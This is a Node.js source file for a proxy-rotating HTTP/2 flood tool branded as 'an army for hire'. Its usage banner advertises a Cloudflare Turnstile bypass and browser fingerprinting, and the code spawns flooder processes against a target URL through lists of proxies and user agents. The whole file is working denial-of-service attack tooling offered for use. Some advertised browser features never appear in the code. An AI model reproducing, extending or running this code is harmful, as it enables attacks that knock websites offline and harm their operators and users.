const { EventEmitter } = require('events');
const puppeteer = require('puppeteer-real-browser');
const http2 = require('http2');
const { spawn } = require('child_process');
const fs = require('fs');
const colors = require('colors');
const { URL } = require('url');
const cluster = require('cluster');
const timers = require('timers/promises');
const tls = require('tls');
const net = require('net');

EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.setMaxListeners(0);

process.on('uncaughtException', (er) => {
    // console.error(er);
});

process.on('unhandledRejection', (er) => {
    // console.error(er);
});

process.on("SIGHUP", () => {
    return 1;
});

process.on("SIGCHILD", () => {
    return 1;
});

if (process.argv.length < 4) {
    console.clear();
    console.log(`\n         ${'ATLAS API CORPORATION'.red.bold} ${'|'.bold} ${'an army for hire'.bold}`);
    console.log('');
    console.log(colors.cyan("                        t.me/atlasapi"));
    console.log(`
    ${`${'BROWSER v1.1'.underline} | Optional browser headless mode, Cloudflare turnstile bypass,
    browser fingerprints, multiple flooders, randrate support, browser optimization.`.italic}

    ${'Usage:'.bold.underline}

        ${`node BROWSER.js ${'['.red.bold}target${']'.red.bold} ${'['.red.bold}duration${']'.red.bold} ${'['.red.bold}threads${']'.red.bold} ${'['.red.bold}rate${']'.red.bold} ${'['.red.bold}proxy${']'.red.bold} ${'('.red.bold}options${')'.red.bold}`.italic}
        ${'node BROWSER.js https://google.com 300 5 90 proxies.txt ua.txt --debug true'.italic}

    ${'Options:'.bold.underline}

        --debug         ${'true'.green}        ${'-'.red.bold}   ${`Enabled basic debugging.`.italic}
        --bypass        ${'true'.green}        ${'-'.red.bold}   ${`IP-cookie bound flood`.italic}
        --flooder       ${'true'.green}        ${'-'.red.bold}   ${`Use built-in HTTP2 flooder.`.italic}
        --headless      ${'true'.green}        ${'-'.red.bold}   ${'Render browser without ui.'.italic}
        --randrate      ${'true'.green}        ${'-'.red.bold}   ${'Random rate of requests.'.italic}
        --optimize      ${'true'.green}        ${'-'.red.bold}   ${'Block stylesheets to increase speed.'.italic}
        --fingerprint   ${'true'.green}        ${'-'.red.bold}   ${'Enable browser fingerprint.'.italic}
    `);
    process.exit(0);
}

const target = process.argv[2]; // || 'https://localhost:443';
const duration = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]) || 10;
const rate = process.argv[5] || 64;
const proxyfile = process.argv[6] || 'proxies.txt';
const uaFile = process.argv[7] || 'ua.txt';

let usedProxies = {};
let flooders = 0;

function error(msg) {
    console.log(`   ${'['.red}${'error'.bold}${']'.red} ${msg}`);
    process.exit(0);
}

if (!proxyfile) { error("Invalid proxy file!"); }
if (!uaFile) { error("Invalid user agent file!"); }
if (!target || !target.startsWith('https://')) { error("Invalid target address (https only)!"); }
if (!duration || isNaN(duration) || duration <= 0) { error("Invalid duration format!"); }
if (!threads || isNaN(threads) || threads <= 0) { error("Invalid threads format!"); }
if (!rate || isNaN(rate) || rate <= 0) { error("Invalid ratelimit format!"); }

var proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');
if (proxies.length <= 0) { error("Proxy file is empty!"); }

const parsed = new URL(target);
const userAgents = fs.readFileSync(uaFile, 'utf-8').toString().replace(/\r/g, '').split('\n');

function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

const options = [
    { flag: '--debug', value: get_option('--debug') },
    { flag: '--bypass', value: get_option('--bypass') },
    { flag: '--flooder', value: get_option('--flooder') },
    { flag: '--headless', value: get_option('--headless') },
    { flag: '--randrate', value: get_option('--randrate') },
    { flag: '--optimize', value: get_option('--optimize') },
    { flag: '--fingerprint', value: get_option('--fingerprint') }
];

function enabled(buf) {
    var flag = `--${buf}`;
    const option = options.find(option => option.flag === flag);

    if (option === undefined) { return false; }

    const optionValue = option.value;

    if (optionValue === "true" || optionValue === true) {
        return true;
    } else if (optionValue === "false" || optionValue === false) {
        return false;
    } else if (!isNaN(optionValue)) {
        return parseInt(optionValue);
    } else {
        return false;
    }
}

function log(string) {
    let d = new Date();
    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();

    if (isNaN(hours) || isNaN(minutes) || isNaN(seconds)) {
        hours = "undefined";
        minutes = "undefined";
        seconds = "undefined";
    }

    if (isNaN(hours) || isNaN(minutes) || isNaN(seconds)) {
        hours = "undefined";
        minutes = "undefined";
        seconds = "undefined";
    }

    if (enabled('debug')) {
        console.log(`[BROWSER] (${`${hours}:${minutes}:${seconds}`.cyan}) | ${string}`);
    }
}

function random_proxy() {
    let proxy = proxies[~~(Math.random() * proxies.length)].split(':');
    while (usedProxies[proxy]) {
        if (Object.keys(usedProxies).length == proxies.length) {
            return;
        }
        proxy = proxies[~~(Math.random() * proxies.length)].split(':');
    }
    return proxy;
}

function random_int(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

async function spawn_flooder(proxy, ua, cookie) {
    let _rate;
    if (enabled('randrate')) {
        _rate = random_int(1, 90);
    } else {
        _rate = rate;
    }

    let bypass;
    if (enabled('bypass')) {
        bypass = [ '--ip', proxy.join(':') ];
    }

    const args = [
        'RESETv2.js',
        'GET',
        target,
        duration,
        '1',
        _rate,
        proxyfile,
        '--cookie',
        `"${cookie}"`,
        '--useragent',
        `"${ua}"`,
        ...(bypass || [])
    ].filter(arg => arg !== undefined);
    
    const xyeta = spawn('node', args, {
        stdio: 'pipe'
    });
    
    xyeta.stdout.on('data', (data) => { /*console.log(data.toString('utf8'))*/ });
    
    // xyeta.stderr.on('data', (data) => { });
    
    xyeta.on('close', (code) => {
        log(`(${colors.magenta(proxy[0])}) Flooder exited with code ${code}`);
    });
}

async function flooder(proxy, ua, cookie) {
    if (!enabled('flooder')) {
        spawn_flooder(proxy, ua, cookie);
        return;
    }
    let tls_conn;
    const socket = net.connect(Number(proxy[1]), proxy[0], () => {
        socket.once('data', () => {
            const client = http2.connect(target, {
                protocol: 'https',
                settings: {
                    headerTableSize: 65536,
                    maxConcurrentStreams: 1000,
                    initialWindowSize: 6291456 * 10,
                    maxHeaderListSize: 262144 * 10,
                    enablePush: false
                },
                createConnection: () => {
                    tls_conn = tls.connect({
                        host: proxy[0],
                        port: proxy[1],
                        rejectUnauthorized: false,
                        secureProtocol: 'TLSv1_2_method'
                    });
                    tls_conn.setNoDelay(true);
                    return tls_conn;
                }
            });

            client.on('connect', () => {
                log(`TLS Connection established with proxy ${proxy.join(':')}`);
                client.destroy();
                socket.destroy();
                spawn_flooder(proxy, ua, cookie);
            });
        });
    });
}

(async function main() {
    for (let i = 0; i < threads; i++) {
        const proxy = random_proxy();
        if (!proxy) { return; }
        const ua = userAgents[~~(Math.random() * userAgents.length)];
        const cookie = `${random_int(1, 1e6)}`;
        flooder(proxy, ua, cookie);
    }
    log('Flooders started.');
})();
